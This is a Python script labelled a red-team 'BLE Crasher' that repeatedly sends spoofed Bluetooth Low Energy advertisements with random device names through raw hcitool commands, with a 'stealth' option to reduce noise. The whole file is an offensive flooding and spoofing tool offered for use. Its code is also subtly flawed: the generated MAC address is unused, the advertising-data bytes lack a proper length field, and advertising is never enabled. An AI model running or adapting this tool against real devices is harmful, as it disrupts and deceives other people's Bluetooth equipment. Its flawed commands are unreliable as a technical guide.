#!/usr/bin/env python3
# BLE Crasher - Advanced Red Team BLE Advertisement Flooding
import subprocess
import random
import argparse
import time
import os
import signal

# ANSI for clarity (no emoticons)
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Generate random MAC-like address
def random_mac():
    return ':'.join(f'{random.randint(0,255):02X}' for _ in range(6))

# Advertising with spoofed names (optional)
def generate_adv_payload(mac=None, name="BLE_FAKE", interval=100):
    # hcitool or better: use 'blesuite' or 'aioblescan' for full control
    cmd = [
        "sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
        "02", "01", "06",  # Flags
        f"{len(name)+1:02x}", "09"
    ] + [f"{ord(c):02x}" for c in name]
    return cmd

def cleanup():
    print(f"{YELLOW}[*] Stopping BLE scan/flood processes...{RESET}")
    subprocess.run(["sudo", "pkill", "-f", "hcitool lescan"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "hciconfig", "hci0", "noleadv"], stdout=subprocess.DEVNULL)

def ble_flood(duration, name_prefix, stealth):
    print(f"{GREEN}[+] Starting BLE Advertisement Flood (Duration: {duration}s, Name Prefix: {name_prefix}){RESET}")

    if not stealth:
        print(f"{YELLOW}[*] Starting duplicate BLE scan (noisy)...{RESET}")
        subprocess.Popen(["sudo", "hcitool", "-i", "hci0", "lescan", "--duplicates"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    end_time = time.time() + duration
    while time.time() < end_time:
        fake_mac = random_mac()
        fake_name = f"{name_prefix}_{random.randint(100,999)}"
        adv_cmd = generate_adv_payload(fake_mac, fake_name)

        try:
            subprocess.run(adv_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"{RED}[!] Error sending fake advertisement: {e}{RESET}")

        time.sleep(0.2)

    cleanup()
    print(f"{GREEN}[✓] BLE Flood complete.{RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Advertisement Flooder")
    parser.add_argument("--duration", type=int, default=30, help="Flood duration in seconds")
    parser.add_argument("--name", default="BLE_FAKE", help="Base name for spoofed devices")
    parser.add_argument("--stealth", action="store_true", help="Avoid scanning to reduce noise")
    args = parser.parse_args()

    try:
        ble_flood(args.duration, args.name, args.stealth)
    except KeyboardInterrupt:
        cleanup()
        print(f"{RED}[!] Interrupted by user.{RESET}")

